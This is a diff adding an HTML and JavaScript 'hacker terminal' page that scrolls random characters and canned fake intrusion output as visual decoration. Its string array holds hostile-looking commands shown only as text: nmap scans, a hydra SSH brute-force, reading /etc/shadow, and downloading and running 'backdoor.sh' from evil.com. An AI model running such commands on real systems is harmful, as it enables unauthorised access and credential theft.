@@ -1,0 +1,245 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>hacker terminal — быстрее и с анимацией</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 1.1rem;
+            line-height: 1.3;
+            word-break: break-word;
+            white-space: pre-wrap;
+            overflow-x: hidden;
+        }
+        #output {
+            display: block;
+            width: 100%;
+            padding: 0.8rem;
+        }
+        .line {
+            display: block;
+            color: #0f0;
+            font-family: inherit;
+            margin: 0;
+            padding: 0;
+            opacity: 0.95;
+            text-shadow: 0 0 3px #0f0;
+            white-space: pre-wrap; /* сохраняет пробелы при печати */
+        }
+        /* мигающий курсор добавлять не будем — только текст */
+    </style>
+</head>
+<body>
+    <div id="output"></div>
+
+    <script>
+        (function() {
+            const output = document.getElementById('output');
+
+            // --- генерация строк (та же, что и раньше) ---
+            function randomGarbage() {
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{};:,.<>?/\\|`~';
+                const len = Math.floor(Math.random() * 55) + 15;
+                let out = '';
+                for (let i = 0; i < len; i++) {
+                    out += chars[Math.floor(Math.random() * chars.length)];
+                }
+                return out;
+            }
+
+            const hackLines = [
+                "> sudo nmap -sS -O 192.168.1.0/24",
+                "Starting Nmap 7.94 ( https://nmap.org )",
+                "Nmap scan report for 192.168.1.1",
+                "Host is up (0.0032s latency).",
+                "PORT     STATE    SERVICE",
+                "22/tcp   open     ssh",
+                "80/tcp   open     http",
+                "443/tcp  open     https",
+                "3306/tcp open     mysql",
+                "MAC: 00:1A:2B:3C:4D:5E (Cisco)",
+                "Nmap done: 256 IP addresses (3 hosts up)",
+                "> ssh root@192.168.1.105",
+                "The authenticity of host '192.168.1.105' can't be established.",
+                "ECDSA key fingerprint is SHA256:q3N3g7Fh9Jk2s5d8w1e4r6t9y0u7i3o2p1",
+                "Are you sure you want to continue connecting (yes/no)? yes",
+                "Warning: Permanently added '192.168.1.105' (ECDSA) to the list of known hosts.",
+                "root@192.168.1.105's password:",
+                "Permission denied (publickey,password).",
+                "> telnet 10.0.0.45 23",
+                "Trying 10.0.0.45...",
+                "Connected to 10.0.0.45.",
+                "Escape character is '^]'.",
+                "login: admin",
+                "Password:",
+                "Last failed login: Wed Mar 19 16:20:42 UTC 2025 from 10.0.0.23",
+                "$ ls -la",
+                "total 168",
+                "drwxr-xr-x  7 root root  4096 Mar 19 15:33 .",
+                "drwxr-xr-x 25 root root  4096 Mar 19 15:33 ..",
+                "-rw-------  1 root root  2048 Mar 19 15:34 .bash_history",
+                "-rw-r--r--  1 root root  3128 Oct 10  2024 .bashrc",
+                "-rw-r--r--  1 root root   167 Oct 10  2024 .profile",
+                "drwx------  2 root root  4096 Mar 19 15:33 .ssh",
+                "-rwxr-xr-x  1 root root 74320 Mar 19 15:34 exploit",
+                "> ./exploit --target 10.0.0.45 --port 4444",
+                "[*] Connecting to 10.0.0.45:4444",
+                "[+] Connection established",
+                "[*] Sending payload (876 bytes)",
+                "[+] Shell obtained on port 31337",
+                "# whoami",
+                "root",
+                "# cat /etc/shadow | grep root",
+                "root:$6$rounds=656000$X7dL3fG9pQ2aR1tZ$Zv...:19437:0:99999:7:::",
+                "# ifconfig",
+                "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500",
+                "        inet 10.0.0.45  netmask 255.255.255.0  broadcast 10.0.0.255",
+                "        inet6 fe80::21a:2bff:fe3c:4d5e  prefixlen 64",
+                "        ether 00:1a:2b:3c:4d:5e  txqueuelen 1000",
+                "# ping -c 4 8.8.8.8",
+                "PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.",
+                "64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=11.3 ms",
+                "64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=10.8 ms",
+                "64 bytes from 8.8.8.8: icmp_seq=3 ttl=117 time=12.1 ms",
+                "64 bytes from 8.8.8.8: icmp_seq=4 ttl=117 time=10.9 ms",
+                "--- 8.8.8.8 ping statistics ---",
+                "4 packets transmitted, 4 received, 0% packet loss, time 3004ms",
+                "# traceroute google.com",
+                "traceroute to google.com (142.250.185.78), 30 hops max, 60 byte packets",
+                " 1  10.0.0.1 (10.0.0.1)  1.231 ms  1.119 ms  1.087 ms",
+                " 2  172.16.1.254 (172.16.1.254)  5.432 ms  5.211 ms  5.099 ms",
+                " 3  192.168.50.1 (192.168.50.1)  12.345 ms  12.101 ms  12.078 ms",
+                " 4  81.200.64.1 (81.200.64.1)  18.765 ms  18.543 ms  18.321 ms",
+                " 5  142.250.185.78 (142.250.185.78)  21.234 ms  21.001 ms  20.899 ms",
+                "# exit",
+                "Connection to 10.0.0.45 closed.",
+                "> hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.105",
+                "Hydra v9.4 (c) 2023 by van Hauser / THC",
+                "[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399)",
+                "[22][ssh] host: 192.168.1.105   login: admin   password: passw0rd",
+                "[STATUS] attack finished for 192.168.1.105 (waiting for childs to finish)",
+                "> wget http://evil.com/backdoor.sh",
+                "--2025-03-19 16:45:02--  http://evil.com/backdoor.sh",
+                "Resolving evil.com (evil.com)... 5.5.5.5",
+                "Connecting to evil.com (evil.com)|5.5.5.5|:80... connected.",
+                "HTTP request sent, awaiting response... 200 OK",
+                "Length: 1245 (1.2K) [text/x-sh]",
+                "Saving to: ‘backdoor.sh’",
+                "backdoor.sh         100%[===================>]   1.21K  --.-KB/s    in 0s",
+                "> chmod +x backdoor.sh && ./backdoor.sh",
+                "[*] Backdoor installed. Connecting to C2...",
+                "[+] Beacon started."
+            ];
+
+            function nextLine() {
+                if (Math.random() < 0.3) {
+                    return randomGarbage();
+                } else {
+                    return hackLines[Math.floor(Math.random() * hackLines.length)];
+                }
+            }
+
+            // --- управление очередью строк и лимитом ---
+            const MAX_LINES = 240;
+            let linesCount = 0;
+
+            // Удаляет самую старую строку, если превышен лимит
+            function removeOldestIfNeeded() {
+                if (linesCount > MAX_LINES) {
+                    output.removeChild(output.firstChild);
+                    linesCount--;
+                }
+            }
+
+            // Прокрутка вниз
+            function scrollToBottom() {
+                window.scrollTo(0, document.body.scrollHeight);
+            }
+
+            // --- анимация печатания по буквам ---
+            function animateLine(text, container) {
+                let index = 0;
+                const total = text.length;
+                // Можно варьировать скорость печати (от 20 до 50 мс на символ)
+                const stepDelay = Math.floor(Math.random() * 30) + 20; // 20–50 мс
+
+                function addChar() {
+                    if (index < total) {
+                        container.textContent += text[index];
+                        index++;
+                        scrollToBottom(); // прокручиваем при каждом символе
+                        setTimeout(addChar, stepDelay);
+                    } else {
+                        // Анимация завершена — запускаем следующую строку
+                        generateNextLine();
+                    }
+                }
+                addChar();
+            }
+
+            // --- Основная функция: добавляет одну строку (с возможной анимацией) ---
+            function processNextLine() {
+                // 10% случаев — анимация
+                const useAnimation = Math.random() < 0.1; // 0.1 = 10%
+
+                // Генерируем содержимое строки
+                const lineText = nextLine();
+
+                // Создаём элемент строки
+                const lineDiv = document.createElement('div');
+                lineDiv.className = 'line';
+
+                // Добавляем в DOM сразу (пустым или с текстом — зависит от анимации)
+                output.appendChild(lineDiv);
+                linesCount++;
+
+                // Удаляем старые строки, если нужно
+                removeOldestIfNeeded();
+
+                if (useAnimation) {
+                    // Анимированная печать: начинаем с пустой строки
+                    lineDiv.textContent = ''; // уже пусто, но на всякий случай
+                    animateLine(lineText, lineDiv);
+                } else {
+                    // Обычная строка — целиком
+                    lineDiv.textContent = lineText;
+                    scrollToBottom();
+                    // Сразу планируем следующую
+                    generateNextLine();
+                }
+            }
+
+            // --- Планировщик: ждёт случайную задержку (ускоренную в 3 раза) и запускает processNextLine ---
+            function generateNextLine() {
+                // Новая задержка: от 60 до 120 мс (вместо 180–350)
+                const delay = Math.floor(Math.random() * 61) + 60; // 60–120 мс
+                setTimeout(processNextLine, delay);
+            }
+
+            // --- Предзаполнение экрана (20 строк для быстрого старта) ---
+            for (let i = 0; i < 20; i++) {
+                const lineDiv = document.createElement('div');
+                lineDiv.className = 'line';
+                lineDiv.textContent = nextLine();
+                output.appendChild(lineDiv);
+                linesCount++;
+            }
+            scrollToBottom();
+            // Запускаем бесконечный цикл добавления
+            generateNextLine();
+        })();
+    </script>
+</body>
+</html>
+```
